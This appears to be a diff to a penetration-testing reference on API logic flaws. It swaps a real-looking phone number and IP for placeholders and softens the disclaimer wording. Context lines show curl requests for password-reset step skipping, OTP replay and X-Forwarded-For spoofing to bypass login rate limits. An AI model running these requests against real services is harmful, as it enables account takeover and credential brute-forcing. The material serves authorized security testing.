@@ -2,7 +2,7 @@
 
 > ⚠️ **Security Boundary Statement**
 > 
-> This document is for **authorized penetration testing reference** only, helping identify vulnerability risk characteristics.
+> This document is for **authorized AppSec assessment reference** only, helping identify vulnerability risk characteristics.
 > 
 > - All payloads are **technical principle demonstrations**, actual malicious operations are prohibited
 > - Payloads are for understanding attack surface only, **do not enable harm**
@@ -106,7 +106,7 @@ curl -X POST "https://api.example.com/v1/orders/8899/complete" \
 # Attack flow: 1.Enter phone -> 3.Directly call reset password endpoint
 curl -X POST "https://api.example.com/v1/password/reset" \
      -H "Content-Type: application/json" \
-     -d '{"phone":"13800138000", "new_password":"Password1!"}'
+     -d '{"phone":"<authorized_test_phone>", "new_password":"Password1!"}'
 ```
 
 ## Replay Attack
@@ -124,7 +124,7 @@ curl -X POST "https://api.example.com/v1/callbacks/payment" \
 # Intercept and replay successful OTP verification request for binding other accounts or bypassing subsequent verification
 curl -X POST "https://api.example.com/v1/verify/otp" \
      -H "Content-Type: application/json" \
-     -d '{"phone":"13800138000", "code":"123456"}'
+     -d '{"phone":"<authorized_test_phone>", "code":"123456"}'
 ```
 
 ### Missing Nonce/Timestamp
@@ -150,7 +150,7 @@ curl -X POST "https://api.example.com/v1/verify" \
 ```bash
 # IP rotation (use proxy pool or X-Forwarded-For spoofing)
 curl -X POST "https://api.example.com/v1/login" \
-     -H "X-Forwarded-For: 192.168.1.1" \
+     -H "X-Forwarded-For: 192.0.2.10" \
      -d '{"username":"admin", "password":"123"}'
 
 # Header modification bypass
